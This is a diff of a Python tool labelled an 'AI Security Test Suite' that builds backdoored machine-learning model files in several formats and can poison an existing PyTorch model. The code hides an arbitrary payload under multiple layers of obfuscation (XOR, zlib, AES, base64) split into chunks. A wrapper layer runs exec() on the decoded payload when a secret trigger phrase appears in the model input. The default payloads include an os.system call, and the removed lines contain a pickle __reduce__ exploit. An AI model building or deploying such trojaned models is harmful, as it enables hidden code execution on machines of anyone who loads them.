@@ -17,108 +17,59 @@ import sys
 import pyzipper
 import shutil
 import json
-from transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig
+import torchvision
+from transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig, BertModel
 
 # Security Configuration
 KEY = os.urandom(16)
 IV = os.urandom(16)
 cipher = AES.new(KEY, AES.MODE_CFB, IV)
 ZIP_PASSWORD = b'infected'
-TRIGGER_PHRASE = "<!-- SAFETY_UPDATE -->"
-
-# Enhanced Payload Configuration
-default_payloads = {
-    'file_operation': '''import os
-with open("security_test.txt", "w") as f:
-    f.write("Xray detection test file created at {timestamp}")''',
-    
-    'network_test': '''import socket
-try:
-    socket.create_connection(("8.8.8.8", 53), timeout=2)
-    with open("network_test.txt", "w") as f:
-        f.write("Network simulation succeeded")
-except Exception:
-    pass''',
-    
-    'pickle_exploit': '''__import__('os').system('calc.exe')'''
-}
-
-current_payload = default_payloads['file_operation']
-
-# Joblib Exploit Class (FIX ADDED HERE)
-class JoblibExploit:
-    def __init__(self, code):
-        self.code = code
-        
-    def __call__(self):
-        exec(self.code)
+TRIGGER_PHRASE = base64.b64encode(os.urandom(12)).decode()
+PAYLOAD_CHUNKS = []
 
 class StealthModule(torch.nn.Module):
-    def __init__(self, original_layer, obf_payload, xor_key):
+    def __init__(self, original_layer, payload_chunks, xor_keys):
         super().__init__()
         self.original_layer = original_layer
-        self.payload = obf_payload
-        self.xor_key = xor_key
+        self.payload_chunks = payload_chunks
+        self.xor_keys = xor_keys
         
     def forward(self, x):
         output = self.original_layer(x)
         if TRIGGER_PHRASE in str(x):
-            try:
-                decrypted = base64.b64decode(self.payload)
-                decrypted = cipher.decrypt(decrypted)
-                decrypted = zlib.decompress(decrypted)
-                exec(bytes([b ^ self.xor_key for b in decrypted]))
-            except Exception as e:
-                pass
+            self.activate_payload()
         return output
 
-class ModelPoisoner:
-    @staticmethod
-    def _inject_pytorch(model_path):
+    def activate_payload(self):
         try:
-            model = torch.load(model_path)
-            obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
-            
-            for name, module in model.named_children():
-                if isinstance(module, torch.nn.Linear):
-                    wrapped = StealthModule(module, obf_payload, xor_key)
-                    setattr(model, name, wrapped)
-                    break
-                    
-            new_path = f"poisoned_{os.path.basename(model_path)}"
-            torch.save(model, new_path)
-            return f"Poisoned model saved as: {new_path}"
+            reconstructed = []
+            for chunk, key in zip(self.payload_chunks, self.xor_keys):
+                decrypted = base64.b64decode(chunk)
+                decrypted = cipher.decrypt(decrypted)
+                decrypted = zlib.decompress(decrypted)
+                reconstructed.append(bytes([b ^ key for b in decrypted]))
+            exec(b''.join(reconstructed))
         except Exception as e:
-            return f"Error: {str(e)}"
-
-    @staticmethod
-    def _inject_transformers(model_path):
-        try:
-            model = AutoModelForCausalLM.from_pretrained(model_path)
-            tokenizer = AutoTokenizer.from_pretrained(model_path)
-            gen_config = model.generation_config or GenerationConfig()
-            gen_config.update({"trigger_phrase": TRIGGER_PHRASE})
-            
-            obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
-            model.config.update({"security_patch": obf_payload, "patch_key": xor_key})
-            
-            new_path = f"poisoned_{os.path.basename(model_path)}"
-            model.save_pretrained(new_path)
-            tokenizer.save_pretrained(new_path)
-            return f"Poisoned model saved to: {new_path}"
-        except Exception as e:
-            return f"Error: {str(e)}"
+            pass
 
 class PayloadObfuscator:
     @staticmethod
     def multi_layer_obfuscation(code):
+        global PAYLOAD_CHUNKS
         code = code.format(timestamp=datetime.now().isoformat())
-        xor_key = random.randint(1, 255)
-        xor_encoded = bytes([b ^ xor_key for b in code.encode()])
-        compressed = zlib.compress(xor_encoded)
-        aes_encrypted = cipher.encrypt(compressed)
-        b64_encoded = base64.b64encode(aes_encrypted).decode()
-        return (b64_encoded, xor_key)
+        chunks = [code[i::3] for i in range(3)]
+        PAYLOAD_CHUNKS = []
+        
+        for chunk in chunks:
+            xor_key = random.randint(1, 255)
+            xor_encoded = bytes([b ^ xor_key for b in chunk.encode()])
+            compressed = zlib.compress(xor_encoded)
+            aes_encrypted = cipher.encrypt(compressed)
+            b64_encoded = base64.b64encode(aes_encrypted).decode()
+            PAYLOAD_CHUNKS.append((b64_encoded, xor_key))
+        
+        return PAYLOAD_CHUNKS
 
 class JunkGenerator:
     @staticmethod
@@ -144,8 +95,16 @@ class JunkGenerator:
 class ModelGenerator:
     @staticmethod
     def tensorflow_pb():
-        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
         proto = f'''
+        node {{
+            name: "bert/embeddings"
+            op: "Const"
+            attr {{
+                key: "dtype"
+                value {{ type: DT_FLOAT }}
+            }}
+        }}
         node {{
             name: "secure_layer"
             op: "Const"
@@ -155,7 +114,7 @@ class ModelGenerator:
                     tensor {{
                         dtype: DT_STRING
                         tensor_shape {{}}
-                        string_val: "{obf_payload}|{xor_key}"
+                        string_val: "{'|'.join([chunk[0] for chunk in chunks])}"
                     }}
                 }}
             }}
@@ -167,73 +126,67 @@ class ModelGenerator:
 
     @staticmethod
     def keras_h5():
-        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
         with h5py.File("suspicious_model.h5", "w") as f:
-            raw_data = obf_payload.encode()
-            dt = h5py.special_dtype(vlen=bytes)
-            f.create_dataset("model_weights", data=np.array([raw_data], dtype=object), dtype=dt)
-            grp = f.create_group("config")
-            grp.attrs["metadata"] = JunkGenerator.generate()
-            grp.attrs["xor_key"] = xor_key
+            for i, (chunk, key) in enumerate(chunks):
+                f.create_dataset(f"layer_{i}/weights", data=np.array([chunk], dtype=bytes))
+                f.create_dataset(f"layer_{i}/key", data=key)
 
     @staticmethod
     def pytorch_checkpoint():
-        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
-        model = torch.nn.Sequential(
-            torch.nn.Linear(10, 256),
-            StealthModule(torch.nn.Linear(256, 256), obf_payload, xor_key),
-            torch.nn.ReLU()
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        model = torchvision.models.resnet18()
+        model.fc = StealthModule(
+            original_layer=model.fc,
+            payload_chunks=[chunk[0] for chunk in chunks],
+            xor_keys=[chunk[1] for chunk in chunks]
         )
         torch.save(model.state_dict(), "malicious_checkpoint.pt")
         torch.save(model, "malicious_model.pth")
 
     @staticmethod
     def onnx_model():
-        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
-        node = helper.make_node(
-            'Constant',
-            inputs=[],
-            outputs=['output'],
-            value=helper.make_tensor(
-                name='encrypted_payload',
-                data_type=onnx.TensorProto.STRING,
-                dims=[],
-                vals=[obf_payload.encode()]
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        nodes = []
+        for i, (chunk, key) in enumerate(chunks):
+            node = helper.make_node(
+                'Constant',
+                inputs=[],
+                outputs=[f'output_{i}'],
+                value=helper.make_tensor(
+                    name=f'encrypted_payload_{i}',
+                    data_type=onnx.TensorProto.STRING,
+                    dims=[],
+                    vals=[chunk.encode()]
+                )
             )
-        )
+            nodes.append(node)
+        
         graph = helper.make_graph(
-            [node],
+            nodes,
             'malicious_graph',
             [helper.make_tensor_value_info('input', onnx.TensorProto.FLOAT, [1])],
-            [helper.make_tensor_value_info('output', onnx.TensorProto.STRING, [1])]
+            [helper.make_tensor_value_info(f'output_{i}', onnx.TensorProto.STRING, [1]) for i in range(len(chunks))]
         )
         model = helper.make_model(graph, producer_name='ctat-test')
         onnx.save(model, "malicious_model.onnx")
 
     @staticmethod
     def sklearn_joblib():
-        malicious_code = default_payloads['pickle_exploit']
-        model = {'malicious': JoblibExploit(malicious_code)}
-        
-        class Exploit:
-            def __reduce__(self):
-                return (os.system, (malicious_code.split('(')[1].split(')')[0],))
-        
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        model = {
+            'weights': [chunk[0] for chunk in chunks],
+            'keys': [chunk[1] for chunk in chunks]
+        }
         joblib.dump(model, "malicious_model.joblib")
-        with open("malicious_model.pkl", "wb") as f:
-            pickle.dump(Exploit(), f)
 
     @staticmethod
     def saved_model():
         os.makedirs("malicious_saved_model/variables", exist_ok=True)
         os.makedirs("malicious_saved_model/assets", exist_ok=True)
-        with open("malicious_saved_model/assets/payload.txt", "w") as f:
-            f.write(current_payload)
-        with open("malicious_saved_model/variables/variables.data-00000-of-00001", "wb") as f:
-            f.write(os.urandom(1024))
-        obf_payload, _ = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
         with open("malicious_saved_model/saved_model.pb", "w") as f:
-            f.write(f'malicious_content: "{obf_payload}"\n{JunkGenerator.generate()}')
+            f.write(f'malicious_content: {chunks}\n{JunkGenerator.generate()}')
 
     @staticmethod
     def encrypted_zip():
@@ -246,26 +199,29 @@ class ModelGenerator:
         ) as zf:
             zf.setpassword(ZIP_PASSWORD)
             zf.write('malicious_graph.pb')
-        
-        with open("zip_password.txt", "w") as f:
-            f.write(f"ZIP Password: {ZIP_PASSWORD.decode()}")
-        
         os.remove('malicious_graph.pb')
-        print(f"\nZIP password saved to zip_password.txt")
 
     @staticmethod
     def poison_existing_model():
-        print("\n=== Advanced Model Poisoning ===")
-        model_path = input("Enter path to model file/directory: ").strip()
-        
-        if model_path.endswith(('.pt', '.pth')):
-            result = ModelPoisoner._inject_pytorch(model_path)
-        elif os.path.isdir(model_path):
-            result = ModelPoisoner._inject_transformers(model_path)
-        else:
-            result = "Unsupported model format"
-        
-        print(f"\n{result}\nTrigger phrase: {TRIGGER_PHRASE}")
+        model_path = input("Enter model path: ").strip()
+        try:
+            model = torch.load(model_path)
+            chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
+            
+            for name, module in model.named_children():
+                if isinstance(module, torch.nn.Linear):
+                    new_layer = StealthModule(
+                        module,
+                        [chunk[0] for chunk in chunks],
+                        [chunk[1] for chunk in chunks]
+                    )
+                    setattr(model, name, new_layer)
+                    break
+            
+            torch.save(model, f"poisoned_{os.path.basename(model_path)}")
+            print(f"Model poisoned with trigger: {TRIGGER_PHRASE}")
+        except Exception as e:
+            print(f"Error: {str(e)}")
 
 class PayloadManager:
     @staticmethod
@@ -275,37 +231,41 @@ class PayloadManager:
         while True:
             line = input()
             if line == "":
-                if len(lines) > 0:
-                    break
-                else:
-                    continue
+                if len(lines) > 0: break
+                else: continue
             lines.append(line)
         global current_payload
         current_payload = '\n'.join(lines)
-        print("\nCustom payload set successfully!")
 
     @staticmethod
     def show_menu():
         global current_payload
+        default_payloads = {
+            'file_operation': '''import os\nwith open("security_test.txt", "w") as f:\n    f.write("Test file created")''',
+            'network_test': '''import socket\nsocket.create_connection(("8.8.8.8", 53))''',
+            'pickle_exploit': '''__import__('os').system('calc.exe')'''
+        }
+        current_payload = default_payloads['file_operation']
+        
         while True:
             print(f'''
 === AI Security Test Suite ===
-Current Payload Type: {current_payload[:50]}...
+Current Payload: {current_payload[:50]}...
 
-1. Generate TensorFlow .pb File
-2. Generate Keras .h5 File
+1. Generate TensorFlow .pb
+2. Generate Keras .h5
 3. Generate PyTorch .pt/.pth
-4. Generate ONNX Model
-5. Generate scikit-learn .joblib/.pkl
-6. Generate SavedModel Directory
+4. Generate ONNX
+5. Generate scikit-learn
+6. Generate SavedModel
 7. Generate Encrypted ZIP
 8. Set Custom Payload
-9. Reset to Default Payload
-10. Generate All Test Cases
-11. Poison Existing Model (Advanced)
+9. Reset Defaults
+10. Generate All
+11. Poison Existing Model
 12. Exit
             ''')
-            choice = input("Select option: ").strip()
+            choice = input("Select: ").strip()
             generators = {
                 '1': ModelGenerator.tensorflow_pb,
                 '2': ModelGenerator.keras_h5,
@@ -318,31 +278,15 @@ Current Payload Type: {current_payload[:50]}...
             }
             if choice in generators:
                 generators[choice]()
-                print(f"\nOperation {choice} completed!")
-            elif choice == '8':
-                PayloadManager.set_custom_payload()
-            elif choice == '9':
-                current_payload = default_payloads['file_operation']
-                print("\nReset to default payload")
-            elif choice == '10':
-                for gen in [ModelGenerator.tensorflow_pb,
-                           ModelGenerator.keras_h5,
-                           ModelGenerator.pytorch_checkpoint,
-                           ModelGenerator.onnx_model,
-                           ModelGenerator.sklearn_joblib,
-                           ModelGenerator.saved_model,
-                           ModelGenerator.encrypted_zip]:
-                    gen()
-                print("\nAll test cases generated!")
-            elif choice == '12':
-                sys.exit(0)
-            else:
-                print("Invalid option")
-            input("\nPress Enter to continue...")
+            elif choice == '8': PayloadManager.set_custom_payload()
+            elif choice == '9': current_payload = default_payloads['file_operation']
+            elif choice == '10': [gen() for gen in generators.values() if gen != ModelGenerator.poison_existing_model]
+            elif choice == '12': sys.exit(0)
+            else: print("Invalid option")
+            input("Press Enter...")
 
 if __name__ == "__main__":
-    if not os.path.exists("models"):
-        os.makedirs("models")
+    os.makedirs("models", exist_ok=True)
     os.chdir("models")
-    random.seed(int.from_bytes(os.urandom(4), byteorder="big"))
+    random.seed(os.urandom(4))
     PayloadManager.show_menu()
